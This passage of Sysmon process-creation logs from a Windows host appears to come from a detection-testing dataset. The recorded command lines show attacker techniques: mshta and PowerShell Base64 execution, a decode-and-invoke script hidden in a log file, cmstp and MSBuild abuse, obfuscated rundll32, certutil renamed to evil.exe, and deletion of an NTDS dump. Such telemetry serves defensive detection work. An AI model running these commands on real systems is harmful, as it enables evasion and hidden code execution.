{9d805503-c308-643e-c101-000000000a00}\r\nParentProcessId: 4368\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:04.000","ProcessGuid":"{9d805503-c37d-643e-c901-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"cmd.exe  /c del C:\\Programdata\\o.txt.ntds.cleartext","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-beee-643e-5c62-080000000000}","LogonId":"0x8625c","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-c308-643e-c101-000000000a00}","ParentProcessId":"4368","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909964,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:05 wins-d19 Microsoft-Windows-Sysmon[3088]: {"EventTime":1686909965,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":238223,"ProcessID":3088,"ThreadID":4036,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:05.000\r\nProcessGuid: {9d805503-f16d-6442-be02-000000000a00}\r\nProcessId: 4460\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\Windows\\System32\\cmd.exe\" /C \"powershell nltest\"\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-bef5-6442-a389-090000000000}\r\nLogonId: 0x989A3\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-f16d-6442-bd02-000000000a00}\r\nParentProcessId: 1372\r\nParentImage: C:\\Windows\\System32\\wscript.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\wscript.exe\" .\\bad.js","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:05.000","ProcessGuid":"{9d805503-f16d-6442-be02-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"\"C:\\Windows\\System32\\cmd.exe\" /C \"powershell nltest\"","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-bef5-6442-a389-090000000000}","LogonId":"0x989a3","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-f16d-6442-bd02-000000000a00}","ParentProcessId":"1372","ParentImage":"C:\\Windows\\System32\\wscript.exe","ParentCommandLine":"\"C:\\Windows\\system32\\wscript.exe\" .\\bad.js","EventReceivedTime":1686909965,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:06 wins-d19 Microsoft-Windows-Sysmon[3088]: {"EventTime":1686909966,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":252688,"ProcessID":3088,"ThreadID":4036,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:06.000\r\nProcessGuid: {9d805503-fab3-6442-0703-000000000a00}\r\nProcessId: 4472\r\nImage: C:\\Windows\\System32\\mshta.exe\r\nFileVersion: 11.00.17763.1 (WinBuild.160101.0800)\r\nDescription: Microsoft (R) HTML Application host\r\nProduct: Internet Explorer\r\nCompany: Microsoft Corporation\r\nOriginalFileName: MSHTA.EXE\r\nCommandLine: mshta.exe  \"vbscript:createobject(\"wscript.shell\").run(\"PowerShell FromBase64String\")\"\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-bef5-6442-a389-090000000000}\r\nLogonId: 0x989A3\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=E616C5CE71886652C13E2E1FA45A653B44D492B054F16B15A38418B8507F57C7\r\nParentProcessGuid: {9d805503-e836-6442-9502-000000000a00}\r\nParentProcessId: 5144\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:06.000","ProcessGuid":"{9d805503-fab3-6442-0703-000000000a00}","Image":"C:\\Windows\\System32\\mshta.exe","FileVersion":"11.00.17763.1 (WinBuild.160101.0800)","Description":"Microsoft (R) HTML Application host","Product":"Internet Explorer","Company":"Microsoft Corporation","OriginalFileName":"MSHTA.EXE","CommandLine":"mshta.exe  \"vbscript:createobject(\"wscript.shell\").run(\"PowerShell FromBase64String\")\"","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-bef5-6442-a389-090000000000}","LogonId":"0x989a3","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=E616C5CE71886652C13E2E1FA45A653B44D492B054F16B15A38418B8507F57C7","ParentProcessGuid":"{9d805503-e836-6442-9502-000000000a00}","ParentProcessId":"5144","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909966,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:07 wins-d19 Microsoft-Windows-Sysmon[2980]: {"EventTime":1686909967,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":1958904,"ProcessID":2980,"ThreadID":3824,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:07.000\r\nProcessGuid: {9d805503-17eb-6453-150c-000000000b00}\r\nProcessId: 5816\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe  /Y /cTyPe explorer.exe\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9796-644a-50d0-3c0200000000}\r\nLogonId: 0x23CD050\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-17c0-6453-130c-000000000b00}\r\nParentProcessId: 2240\r\nParentImage: C:\\Users\\lisawalker\\Desktop\\explorer.exe\r\nParentCommandLine: \"C:\\Users\\lisawalker\\Desktop\\explorer.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:07.000","ProcessGuid":"{9d805503-17eb-6453-150c-000000000b00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"cmd.exe  /Y /cTyPe explorer.exe","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9796-644a-50d0-3c0200000000}","LogonId":"0x23cd050","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-17c0-6453-130c-000000000b00}","ParentProcessId":"2240","ParentImage":"C:\\Users\\lisawalker\\Desktop\\explorer.exe","ParentCommandLine":"\"C:\\Users\\lisawalker\\Desktop\\explorer.exe\" ","EventReceivedTime":1686909967,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:08 wins-d19 Microsoft-Windows-Sysmon[2980]: {"EventTime":1686909968,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":1730251,"ProcessID":2980,"ThreadID":3824,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:08.000\r\nProcessGuid: {9d805503-8190-6451-bb0a-000000000b00}\r\nProcessId: 6112\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe  /c MSBuildShell.csproj\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9796-644a-2cd0-3c0200000000}\r\nLogonId: 0x23CD02C\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-8163-6451-b90a-000000000b00}\r\nParentProcessId: 2748\r\nParentImage: C:\\Users\\lisawalker\\Desktop\\derp.exe\r\nParentCommandLine: \"C:\\Users\\lisawalker\\Desktop\\derp.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:08.000","ProcessGuid":"{9d805503-8190-6451-bb0a-000000000b00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"cmd.exe  /c MSBuildShell.csproj","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9796-644a-2cd0-3c0200000000}","LogonId":"0x23cd02c","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-8163-6451-b90a-000000000b00}","ParentProcessId":"2748","ParentImage":"C:\\Users\\lisawalker\\Desktop\\derp.exe","ParentCommandLine":"\"C:\\Users\\lisawalker\\Desktop\\derp.exe\" ","EventReceivedTime":1686909968,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:09 wins-d19 Microsoft-Windows-Sysmon[2980]: {"EventTime":1686909969,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":1730270,"ProcessID":2980,"ThreadID":3824,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:09.000\r\nProcessGuid: {9d805503-8191-6451-bc0a-000000000b00}\r\nProcessId: 3432\r\nImage: C:\\Users\\lisawalker\\Desktop\\MSBuildShell.csproj\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: MSBuildShell.csproj\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9796-644a-2cd0-3c0200000000}\r\nLogonId: 0x23CD02C\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-8190-6451-bb0a-000000000b00}\r\nParentProcessId: 6112\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: cmd.exe  /c MSBuildShell.csproj","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:09.000","ProcessGuid":"{9d805503-8191-6451-bc0a-000000000b00}","Image":"C:\\Users\\lisawalker\\Desktop\\MSBuildShell.csproj","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"MSBuildShell.csproj","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9796-644a-2cd0-3c0200000000}","LogonId":"0x23cd02c","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-8190-6451-bb0a-000000000b00}","ParentProcessId":"6112","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"cmd.exe  /c MSBuildShell.csproj","EventReceivedTime":1686909969,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:10 wins-d19 Microsoft-Windows-Sysmon[2072]: {"EventTime":1686909970,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":203460,"ProcessID":2072,"ThreadID":3824,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:10.000\r\nProcessGuid: {9d805503-2d60-6448-c401-000000000a00}\r\nProcessId: 4012\r\nImage: C:\\Windows\\System32\\cmstp.exe\r\nFileVersion: 7.2.17763.1 (WinBuild.160101.0800)\r\nDescription: Microsoft Connection Manager Profile Installer\r\nProduct: Microsoft(R) Connection Manager\r\nCompany: Microsoft Corporation\r\nOriginalFileName: CMSTP.EXE\r\nCommandLine: C:\\Windows\\System32\\cmstp.exe  /s  C:\\Users\\lisawalker\\Desktop\\everything.xml\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-24fa-6448-364b-130000000000}\r\nLogonId: 0x134B36\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=DB3F360BDB292C0679C13149AC6F454F7DCE768BDE559D87CE718023A6985A0D\r\nParentProcessGuid: {9d805503-2d51-6448-c101-000000000a00}\r\nParentProcessId: 5408\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:10.000","ProcessGuid":"{9d805503-2d60-6448-c401-000000000a00}","Image":"C:\\Windows\\System32\\cmstp.exe","FileVersion":"7.2.17763.1 (WinBuild.160101.0800)","Description":"Microsoft Connection Manager Profile Installer","Product":"Microsoft(R) Connection Manager","Company":"Microsoft Corporation","OriginalFileName":"CMSTP.EXE","CommandLine":"C:\\Windows\\System32\\cmstp.exe  /s  C:\\Users\\lisawalker\\Desktop\\everything.xml","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-24fa-6448-364b-130000000000}","LogonId":"0x134b36","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=DB3F360BDB292C0679C13149AC6F454F7DCE768BDE559D87CE718023A6985A0D","ParentProcessGuid":"{9d805503-2d51-6448-c101-000000000a00}","ParentProcessId":"5408","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909970,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:11 wins-d19 Microsoft-Windows-Sysmon[1876]: {"EventTime":1686909971,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":218559,"ProcessID":1876,"ThreadID":3888,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:11.000\r\nProcessGuid: {9d805503-1dbf-6438-d401-000000000a00}\r\nProcessId: 2068\r\nImage: C:\\Windows\\System32\\rundll32.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows host process (Rundll32)\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: RUNDLL32.EXE\r\nCommandLine: \"C:\\WINDOWS\\system32\\rundll32.exe\" \\-------------____________-__-----__-.-------------____________-__-----__-,AeGkEqS4gIuW0cES\r\nCurrentDirectory: C:\\Users\\lisawalker\\Desktop\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-10de-6438-404a-0e0000000000}\r\nLogonId: 0xE4A40\r\nTerminalSessionId: 2\r\nIntegrityLevel: High\r\nHashes: SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481\r\nParentProcessGuid: {9d805503-1124-6438-f800-000000000a00}\r\nParentProcessId: 1296\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:11.000","ProcessGuid":"{9d805503-1dbf-6438-d401-000000000a00}","Image":"C:\\Windows\\System32\\rundll32.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows host process (Rundll32)","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"RUNDLL32.EXE","CommandLine":"\"C:\\WINDOWS\\system32\\rundll32.exe\" \\-------------____________-__-----__-.-------------____________-__-----__-,AeGkEqS4gIuW0cES","CurrentDirectory":"C:\\Users\\lisawalker\\Desktop\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-10de-6438-404a-0e0000000000}","LogonId":"0xe4a40","TerminalSessionId":"2","IntegrityLevel":"High","Hashes":"SHA256=9F1E56A3BF293AC536CF4B8DAD57040797D62DBB0CA19C4ED9683B5565549481","ParentProcessGuid":"{9d805503-1124-6438-f800-000000000a00}","ParentProcessId":"1296","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","EventReceivedTime":1686909971,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:12 wins-d19 Microsoft-Windows-Sysmon[3096]: {"EventTime":1686909972,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":1882,"ProcessID":3096,"ThreadID":4180,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:12.000\r\nProcessGuid: {9d805503-1c53-6440-1101-000000000a00}\r\nProcessId: 5208\r\nImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nFileVersion: 10.0.17763.1 (WinBuild.160101.0800)\r\nDescription: Windows PowerShell\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: PowerShell.EXE\r\nCommandLine: powershell.exe  -Command \"{ $a=Get-Content C:\\Windows\\logs\\system-logs.txt | Select -Index 17033;$script_decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a)); $script_block = [Scriptblock]::Create($script_decoded);Invoke-Command $script_block}\"\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-1bd0-6440-ad85-0e0000000000}\r\nLogonId: 0xE85AD\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C\r\nParentProcessGuid: {9d805503-1c50-6440-0f01-000000000a00}\r\nParentProcessId: 1856\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"C:\\Windows\\system32\\cmd.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:12.000","ProcessGuid":"{9d805503-1c53-6440-1101-000000000a00}","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","FileVersion":"10.0.17763.1 (WinBuild.160101.0800)","Description":"Windows PowerShell","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"PowerShell.EXE","CommandLine":"powershell.exe  -Command \"{ $a=Get-Content C:\\Windows\\logs\\system-logs.txt | Select -Index 17033;$script_decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($a)); $script_block = [Scriptblock]::Create($script_decoded);Invoke-Command $script_block}\"","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-1bd0-6440-ad85-0e0000000000}","LogonId":"0xe85ad","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=DE96A6E69944335375DC1AC238336066889D9FFC7D73628EF4FE1B1B160AB32C","ParentProcessGuid":"{9d805503-1c50-6440-0f01-000000000a00}","ParentProcessId":"1856","ParentImage":"C:\\Windows\\System32\\cmd.exe","ParentCommandLine":"\"C:\\Windows\\system32\\cmd.exe\" ","EventReceivedTime":1686909972,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
<14>Jun 16 10:06:13 wins-d19 Microsoft-Windows-Sysmon[3120]: {"EventTime":1686909973,"Hostname":"wins-d19","Keywords":-9223372036854775808,"EventType":"INFO","SeverityValue":2,"Severity":"INFO","EventID":1,"SourceName":"Microsoft-Windows-Sysmon","ProviderGuid":"{5770385F-C22A-43E0-BF4C-06F5698FFBD9}","Version":5,"Task":1,"OpcodeValue":0,"RecordNumber":7204,"ProcessID":3120,"ThreadID":3856,"Channel":"Microsoft-Windows-Sysmon/Operational","Domain":"NT AUTHORITY","AccountName":"SYSTEM","UserID":"S-1-5-18","AccountType":"User","Message":"Process Create:\r\nRuleName: -\r\nUtcTime: 2023-06-16 10:06:13.000\r\nProcessGuid: {9d805503-910f-6441-0701-000000000a00}\r\nProcessId: 4712\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.17763.1697 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft® Windows® Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"C:\\windows\\system32\\cmd.exe\" /c copy /b C:\\Windows\\System32\\*ertut*.exe c:\\Drivers\\evil.exe\r\nCurrentDirectory: C:\\Users\\lisawalker\\\r\nUser: wins-d19\\lisawalker\r\nLogonGuid: {9d805503-9034-6441-3c57-0e0000000000}\r\nLogonId: 0xE573C\r\nTerminalSessionId: 2\r\nIntegrityLevel: Medium\r\nHashes: SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527\r\nParentProcessGuid: {9d805503-90ff-6441-0201-000000000a00}\r\nParentProcessId: 2772\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","Category":"Process Create (rule: ProcessCreate)","Opcode":"Info","RuleName":"-","UtcTime":"2023-06-16 10:06:13.000","ProcessGuid":"{9d805503-910f-6441-0701-000000000a00}","Image":"C:\\Windows\\System32\\cmd.exe","FileVersion":"10.0.17763.1697 (WinBuild.160101.0800)","Description":"Windows Command Processor","Product":"Microsoft® Windows® Operating System","Company":"Microsoft Corporation","OriginalFileName":"Cmd.Exe","CommandLine":"\"C:\\windows\\system32\\cmd.exe\" /c copy /b C:\\Windows\\System32\\*ertut*.exe c:\\Drivers\\evil.exe","CurrentDirectory":"C:\\Users\\lisawalker\\","User":"wins-d19\\lisawalker","LogonGuid":"{9d805503-9034-6441-3c57-0e0000000000}","LogonId":"0xe573c","TerminalSessionId":"2","IntegrityLevel":"Medium","Hashes":"SHA256=BC866CFCDDA37E24DC2634DC282C7A0E6F55209DA17A8FA105B07414C0E7C527","ParentProcessGuid":"{9d805503-90ff-6441-0201-000000000a00}","ParentProcessId":"2772","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ParentCommandLine":"\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" ","EventReceivedTime":1686909973,"SourceModuleName":"in_sysmon","SourceModuleType":"im_msvistalog"}
